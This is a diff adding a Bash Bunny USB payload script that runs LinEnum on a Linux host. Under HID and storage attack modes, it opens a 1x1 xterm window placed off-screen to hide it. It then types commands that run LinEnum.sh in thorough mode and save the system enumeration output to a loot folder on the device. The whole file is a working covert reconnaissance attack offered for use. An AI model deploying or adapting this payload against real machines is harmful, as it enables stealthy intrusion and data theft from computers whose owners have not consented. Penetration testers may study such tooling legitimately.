@@ -1,0 +1,40 @@
+#!/bin/bash
+#
+# Title: LinEnumBunny
+# Description: Bash Bunny LinEnum launcher
+# Original Author: Raul Bringas (r4mzih4x)
+# LinEnum Author: @rebootuser - https://github.com/rebootuser/LinEnum
+# Version: 0.1
+# Category: Recon
+# Target: Linux
+# Attackmodes: HID, STORAGE
+#
+# Executes LinEnum.sh in thorough mode to extract detailed information from the Linux host.
+#
+
+# Setup
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+# Attack
+LED ATTACK
+RUN UNITY xterm -geometry 1x1+1500+1500
+Q DELAY 1000
+Q STRING export lootdir=/media/\$USER/BashBunny/loot/BunnyLinEnum
+Q ENTER
+Q STRING mkdir -p \$lootdir
+Q ENTER
+Q STRING export scriptdir=/media/\$USER/BashBunny/payloads/$SWITCH_POSITION
+Q ENTER
+Q STRING bash \$scriptdir/LinEnum.sh -r \$lootdir/LinEnumOuput.txt
+Q ENTER
+Q STRING clear
+Q ENTER
+Q STRING exit
+Q ENTER
+
+# Attack completed
+REM Find better way to determine script being done
+sleep 30;
+LED FINISH
